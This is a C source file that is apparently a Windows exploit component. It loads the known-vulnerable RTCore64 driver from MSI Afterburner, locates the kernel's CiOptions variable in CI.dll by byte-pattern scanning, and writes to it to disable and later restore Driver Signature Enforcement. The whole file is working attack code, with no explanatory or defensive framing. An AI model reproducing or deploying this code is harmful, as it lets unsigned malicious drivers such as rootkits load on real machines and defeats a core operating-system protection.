#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include <SetupAPI.h>
#include "driversimplementation/rtcore64.h"

#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS) 0x0B
#define MAX_DRIVER_FILES 4

typedef NTSTATUS (*RtlGetVersionProc)(PRTL_OSVERSIONINFOW prtl_osversioninfow);
typedef NTSTATUS (*NtQuerySystemInformationProc)(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
typedef int (*open_device)(const CHAR* driver_symlink, HANDLE* device_handle);
typedef int (*read_memory)(HANDLE device_handle, DWORD64 address_64, DWORD size, DWORD* value);
typedef int (*write_memory)(HANDLE device_handle, DWORD64 address_64, DWORD size, DWORD value);
typedef int (*start_driver)();
typedef int (*stop_driver)();

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];

}RTL_PROCESS_MODULE_INFORMATION,*PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];

}RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;


typedef struct _VULNERABLE_DRIVER
{
    const CHAR *provider;
	const CHAR *tool_tip_text;
	open_device p_open_device_func;
	read_memory p_read_memory_func;
	write_memory p_write_memory_func;
	const CHAR *service_name;
	const CHAR *driver_symlink;
	UCHAR* driver_file[MAX_DRIVER_FILES];
	const CHAR *hardware_id;
	HDEVINFO device_infoset;
	SP_DEVINFO_DATA device_info_data;
	DWORD min_supported_buildnumber;
	DWORD max_supported_buildnumber;

} VULNERABLE_DRIVER, *PVULNERABLE_DRIVER;

typedef struct _DSE_SYSTEM_INFO
{
    DWORD patch_size;
    DWORD dse_restore_value;
    DWORD dse_disable_value;
    UINT64 patch_address;

} DSE_SYSTEM_INFO, *PDSE_SYSTEM_INFO;

int dse_inti();
int dse_disable();
int dse_restore();
int _get_kernel_imagebase_ci();
int _patch_dse_value(DWORD value);
int _get_os_version();
UINT64 _get_CiOptions_address();
void _get_sequence_entry(BYTE* address, BYTE* sequence, DWORD seq_size, BYTE** entry_address);

VULNERABLE_DRIVER vulnerable_drivers[1] =
{
    {
        .provider = "RTCore64 v4.6.2 (from MSI Afterburner v4.6.2 Build 15658)",
        .tool_tip_text = "RTCore64 v4.6.2 supports Windows Vista and later.",
        .p_open_device_func = rtcore64_open_device,
        .p_read_memory_func = rtcore64_read_memory,
        .p_write_memory_func = rtcore64_write_memory,
        .service_name = "RTCore64",
        .driver_symlink = "\\\\.\\RTCore64",
        .driver_file = {((UCHAR*) "C:\\Windows\\System32\\drivers\\RTCore64")},
        .device_infoset = INVALID_HANDLE_VALUE,
        .device_info_data = {},
        .min_supported_buildnumber = 6000,
        .max_supported_buildnumber = 0xFFFFFFFF
    }
};

PVULNERABLE_DRIVER vulnerable_driver_selected = &vulnerable_drivers[0];
DSE_SYSTEM_INFO dse_system_info;

int _get_kernel_imagebase_ci(PVOID* cidll_kernel_imagebase, ULONG* cidll_kernel_imagesize)
{
    HMODULE lib_module = LoadLibrary(L"ntdll.dll");
    if (lib_module == NULL) return 1;
    
    NtQuerySystemInformationProc NtQuerySystemInformation = (NtQuerySystemInformationProc) GetProcAddress(lib_module, "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL)
    {
        FreeLibrary(lib_module);
        return 1;
    }

    ULONG modules_information_size = 0;
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &modules_information_size);

    if (modules_information_size == 0)
    {
        FreeLibrary(lib_module);
        return 1;
    }
    

    PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES) malloc(modules_information_size);

    if (modules == NULL)
    {
        free(modules);
        FreeLibrary(lib_module);
        return 1;
    }

    if (NtQuerySystemInformation(SystemModuleInformation, modules, modules_information_size, &modules_information_size) != STATUS_SUCCESS)
    {
        free(modules);
        FreeLibrary(lib_module);
        return 1;
    }

    FreeLibrary(lib_module);

    for (int module_index = 0; module_index < modules->NumberOfModules; module_index++)
    {
        if (strcmp((const char*) &modules->Modules[module_index].FullPathName[modules->Modules[module_index].OffsetToFileName], "CI.dll") == 0)
        {
            *cidll_kernel_imagebase = modules->Modules[module_index].ImageBase;
            *cidll_kernel_imagesize = modules->Modules[module_index].ImageSize;
            break;
        }
    }

    free(modules);
    return 0;
}

UINT64 _get_CiOptions_address()
{
    WCHAR CI_path[MAX_PATH];
    memset(CI_path, 0, MAX_PATH);

    if (GetSystemDirectory(CI_path, MAX_PATH) == 0)
    {
        return 0;
    }

    lstrcatW(CI_path, L"\\ci.dll");

    HMODULE lib_module = LoadLibraryEx(CI_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (lib_module == NULL) return 0;

    BYTE* CiInitialize = (BYTE*) GetProcAddress(lib_module, "CiInitialize");

    if (CiInitialize == NULL)
    {
        FreeLibrary(lib_module);
        return 0;
    }

    BYTE call_cip_sequence[3] = {0x8B, 0xCD, 0xE8};
    BYTE* call_cip_entry_seq_addr = CiInitialize;
    _get_sequence_entry(CiInitialize, call_cip_sequence, 3, &call_cip_entry_seq_addr);

    LONG CipInitialize_offset = *((LONG*) (call_cip_entry_seq_addr + 0x3));

    BYTE* CipInitialize = (BYTE*) (call_cip_entry_seq_addr + 0x7 + CipInitialize_offset);

    BYTE mov_CiOptions_sequence[3] = {0x49, 0x8B, 0xE9};
    BYTE* mov_CiOptions_entry_seq_addr = CipInitialize;
    _get_sequence_entry(CipInitialize, mov_CiOptions_sequence, 3, &mov_CiOptions_entry_seq_addr);

    LONG CiOptions_offset = *((LONG*) (mov_CiOptions_entry_seq_addr + 0x5));
    unsigned long CiOptions_offset_unsigned = *((unsigned long*) (mov_CiOptions_entry_seq_addr + 0x5));

    BYTE* CiOptions = (BYTE*) (mov_CiOptions_entry_seq_addr + 0x9 + CiOptions_offset);
    
    PVOID cidll_kernel_imagebase = NULL;
    ULONG cidll_kernel_imagesize = 0;
    _get_kernel_imagebase_ci(&cidll_kernel_imagebase, &cidll_kernel_imagesize);

    FreeLibrary(lib_module);
    return ((UINT64) cidll_kernel_imagebase + (UINT64) CiOptions - (UINT64) lib_module);
}

void _get_sequence_entry(BYTE* address, BYTE* sequence, DWORD seq_size, BYTE** entry_address)
{
    while (1)
    {
        DWORD found = 0;
        for (int i = 0; i < seq_size; i++)
        {
            if (*(address + i) != *(sequence + i)) break;
            found++;
        }

        if (found == seq_size)
        {
            *entry_address = address;
            break;
        }

        address += 1;
    }
    return;
}

int _patch_dse_value(DWORD value)
{
    HANDLE device_handle = INVALID_HANDLE_VALUE;
    if (vulnerable_driver_selected->p_open_device_func(vulnerable_driver_selected->driver_symlink, &device_handle) != 0)
    {
        printf("Last error: %d\n", GetLastError());
        return 1;
    }
   
    if (vulnerable_driver_selected->p_write_memory_func(
        device_handle, dse_system_info.patch_address, dse_system_info.patch_size, value) != 0) return 1;

    CloseHandle(device_handle);
    return 0;
}

int dse_disable()
{
    return _patch_dse_value(dse_system_info.dse_disable_value);
}

int dse_restore()
{
    return _patch_dse_value(dse_system_info.dse_restore_value);
}

int _get_os_version()
{
    RTL_OSVERSIONINFOW rtl_osversioninfow;
    rtl_osversioninfow.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

    HMODULE lib_module = LoadLibrary(L"ntdll.dll");
    if (lib_module == NULL) return 0;

    RtlGetVersionProc RtlGetVersion = (RtlGetVersionProc) GetProcAddress(lib_module, "RtlGetVersion");
    if (RtlGetVersion == NULL) return 0;

    if (RtlGetVersion(&rtl_osversioninfow) != 0) return 0;

    return rtl_osversioninfow.dwBuildNumber;
}

int dse_init()
{
    dse_system_info.patch_size = 0x4;
    dse_system_info.dse_disable_value = 0x0;
    
    UINT64 CiOptions_addrr = _get_CiOptions_address();
    if (CiOptions_addrr == 0) return 1;
    dse_system_info.patch_address = CiOptions_addrr;

    HANDLE device_handle = INVALID_HANDLE_VALUE;
    if (vulnerable_driver_selected->p_open_device_func(vulnerable_driver_selected->driver_symlink, &device_handle) != 0)
    {
        printf("Last error: %d\n", GetLastError());
        return 1;
    }

    if (vulnerable_driver_selected->p_read_memory_func(
        device_handle, dse_system_info.patch_address, dse_system_info.patch_size, &(dse_system_info.dse_restore_value)) != 0) return 1;
    
    CloseHandle(device_handle);
    return 0;
}